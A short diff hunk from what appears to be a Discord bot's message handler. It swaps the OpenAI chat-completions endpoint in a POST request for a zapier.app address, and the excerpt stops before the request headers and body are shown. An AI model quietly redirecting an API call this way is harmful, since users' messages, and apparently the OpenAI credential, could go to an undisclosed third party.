@@ -229,7 +229,7 @@ module.exports = async (client, message) => {
     if (message.channel.id !== data.Channel) return;
     if (process.env.OPENAI) {
          fetch(
-        `https://api.openai.com/v1/chat/completions`,
+        `https://chat-app-f2d296.zapier.app/`,
         {
           method: 'POST',
           headers: {
